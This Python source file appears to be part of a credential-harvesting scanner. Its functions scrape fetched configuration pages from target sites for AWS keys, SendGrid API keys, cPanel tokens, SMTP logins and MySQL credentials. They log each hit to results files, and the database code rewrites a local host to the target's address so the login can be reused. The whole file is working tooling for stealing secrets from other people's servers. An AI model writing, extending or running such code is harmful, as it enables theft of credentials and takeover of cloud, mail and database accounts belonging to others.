import re


def aws(page):
    global aws_key, aws_sec
    try:
        if '"s3":' in page:
            try:
                aws_key = re.findall('"secretAccessKey": "(.*?)"', page)[0]
            except:
                aws_key = ''
            try:
                aws_sec = re.findall('"accessKeyId": "(.*?)"', page)[0]
            except:
                aws_sec = ''
            try:
                aws_reg = re.findall('"region": "(.*?)"', page)[0]
            except:
                aws_reg = "us-east-1"
            if aws_key == '' or aws_sec == '' or aws_key == 'null' or aws_sec == 'null':
                pass
            else:
                build = aws_key + "|" + aws_sec + "|" + aws_reg
                remover = build.replace('\r', '')
                aws = open('Results/valid_aws.txt', 'a')
                aws.write(remover + '\n')
                aws.close()
                return aws_key, aws_sec, aws_reg
        else:
            return False
    except:
        return False


def sendgrid(page):
    try:
        if '"sendgrid_key":' in page:
            send = re.findall('"sendgrid_key": "(.*?)"', page)[0]
            build = "apikey" + "|" + send
            remover = build.replace('\r', '')
            sendje = open('Results/sendgrid_api.txt', 'a')
            sendje.write(remover + '\n')
            sendje.close()
            return True
        else:
            return False
    except:
        return False


def cpanel(page):
    try:
        if '"cpanelauth":' in page:
            cpanel = re.findall('"cpanelauth": "cpanel (.*?)"', page)[0]
            scrijven = open("Results/cpanels.txt", "a")
            scrijven.write(cpanel + "\n")
            scrijven.close()
            return True
        else:
            return False
    except:
        return False


def smtpjs(page, star):
    global smtp_username, smtp_password, smtp_host, smtp_port, smtp_from
    method = "/configjson"
    smtp_name = ""
    try:
        if '"smtp_host":' in page:
            try:
                smtp_host = re.findall('"smtp_host":"(.*?)"', page)[0]
            except:
                smtp_host = ''
            try:
                smtp_port = re.findall('"smtp_port":"(.*?)"', page)[0]
            except:
                smtp_port = "587"
            try:
                smtp_username = re.findall('"smtp_user":"(.*?)"', page)[0]
            except:
                smtp_username = ''
            try:
                smtp_password = re.findall('"smtp_pass":"(.*?)"', page)[0]
            except:
                smtp_password = ''
            try:
                smtp_from = re.findall('"smtp_from":"(.*?)"', page)[0]
            except:
                smtp_from = ''
        if smtp_username == '' or smtp_password == '' or smtp_username == 'null' or smtp_password == 'null' or smtp_username == '""' or smtp_password == '""':
            return False
        else:
            build = 'URL: ' + str(star) + '\nMETHOD: ' + str(method) + '\nMAILHOST: ' + str(
                smtp_host) + '\nMAILPORT: ' + str(smtp_port) + '\nMAILUSER: ' + str(
                smtp_username) + '\nMAILPASS: ' + str(smtp_password) + '\nMAILFROM: ' + str(
                smtp_from) + '\nFROMNAME: ' + str(smtp_name)
            remover = build.replace('\r', '')
            smtps = open("Results/valid_smtps.txt", "a")
            smtps.write(remover + '\n\n')
            smtps.close()
            return smtp_host, smtp_port, smtp_username, smtp_password, smtp_from
    except:
        return False


def json_databases(page, star):
    global db_host, db_port, db_database, db_username, db_password
    db_connection = "mysql"
    method = "/CONFIG_JSON"
    try:
        if '"database":' in page or '"DATABASE_HOST":' in page or '"user": "' in page or '"dbname": "' in page:
            if '"database":' in page:
                try:
                    db_host = re.findall('"host": "(.*?)"', page)[0]
                    if "localhost" in db_host:
                        db_host = star.replace("http://", "").replace("https://", "").split(":")[0]
                    elif "127.0.0.1" in db_host:
                        db_host = star.replace("http://", "").replace("https://", "").split(":")[0]
                except:
                    db_host = star.replace("http://", "").replace("https://", "").split(":")[0]
                try:
                    db_port = re.findall('"port": "(.*?)"', page)[0]
                except:
                    db_port = "3306"
                try:
                    db_username = re.findall('"username": "(.*?)"', page)[0]
                except:
                    db_username = ''
                try:
                    db_password = re.findall('"password": "(.*?)"', page)[0]
                except:
                    db_password = ''
                try:
                    db_database = re.findall('"name": "(.*?)"', page)[0]
                except:
                    db_database = ''
            if '"DATABASE_HOST":' in page:
                try:
                    db_host = re.findall('"DATABASE_HOST": "(.*?)"', page)[0]
                    if "localhost" in db_host:
                        db_host = star.replace("http://", "").replace("https://", "").split(":")[0]
                    elif "127.0.0.1" in db_host:
                        db_host = star.replace("http://", "").replace("https://", "").split(":")[0]
                except:
                    db_host = star.replace("http://", "").replace("https://", "").split(":")[0]
                try:
                    db_port = re.findall('"DATABASE_PORT": (.*?)"', page)[0].replace('"', "")
                except:
                    db_port = "3306"
                try:
                    db_username = re.findall('"DATABASE_USER": "(.*?)"', page)[0]
                except:
                    db_username = ''
                try:
                    db_password = re.findall('"DATABASE_PASSWORD": "(.*?)"', page)[0]
                except:
                    db_password = ''
                try:
                    db_database = re.findall('"DATABASE_GLOBAL_DBNAME": "(.*?)"', page)[0]
                except:
                    db_database = ''
            if '"user": "' in page:
                try:
                    db_host = re.findall('"host": "(.*?)"', page)[0]
                    if "localhost" in db_host:
                        db_host = star.replace("http://", "").replace("https://", "").split(":")[0]
                    elif "127.0.0.1" in db_host:
                        db_host = star.replace("http://", "").replace("https://", "").split(":")[0]
                except:
                    db_host = star.replace("http://", "").replace("https://", "").split(":")[0]
                try:
                    db_port = re.findall('"port": "(.*?)"', page)[0]
                except:
                    db_port = "3306"
                try:
                    db_username = re.findall('"user": "(.*?)"', page)[0]
                except:
                    db_username = ''
                try:
                    db_password = re.findall('"password": "(.*?)"', page)[0]
                except:
                    db_password = ''
                try:
                    db_database = re.findall('"database": "(.*?)"', page)[0]
                except:
                    db_database = ''
            if '"dbname": "' in page:
                try:
                    db_host = re.findall('"host": "(.*?)"', page)[0]
                    if "localhost" in db_host:
                        db_host = star.replace("http://", "").replace("https://", "").split(":")[0]
                    elif "127.0.0.1" in db_host:
                        db_host = star.replace("http://", "").replace("https://", "").split(":")[0]
                except:
                    db_host = star.replace("http://", "").replace("https://", "").split(":")[0]
                try:
                    db_port = re.findall('"port": "(.*?)"', page)[0]
                except:
                    db_port = "3306"
                try:
                    db_username = re.findall('"user": "(.*?)"', page)[0]
                except:
                    db_username = ''
                try:
                    db_password = re.findall('"password": "(.*?)"', page)[0]
                except:
                    db_password = ''
                try:
                    db_database = re.findall('"dbname": "(.*?)"', page)[0]
                except:
                    db_database = ''
            url = star
            if db_username == '' or db_password == '' or db_username == 'null' or db_password == 'null':
                return False
            else:
                build = 'URL: ' + str(star) + '\nMETHOD: ' + str(method) + '\nDB_CONNECTION: ' + str(
                    db_connection) + '\nDB_HOST: ' + str(db_host) + '\nDB_PORT: ' + str(
                    db_port) + '\nDB_DATABASE: ' + str(db_database) + '\nDB_USERNAME: ' + str(
                    db_username) + '\nDB_PASSWORD: ' + str(db_password)
                remover = str(build).replace('\r', '').replace('"', '').replace("'", "")
                save = open('Results/DATABASE.txt', 'a')
                save.write(remover + '\n\n')
                save.close()
                return url, method, db_connection, db_host, db_port, db_database, db_username, db_password
        else:
            return False
    except Exception as e:
        return False
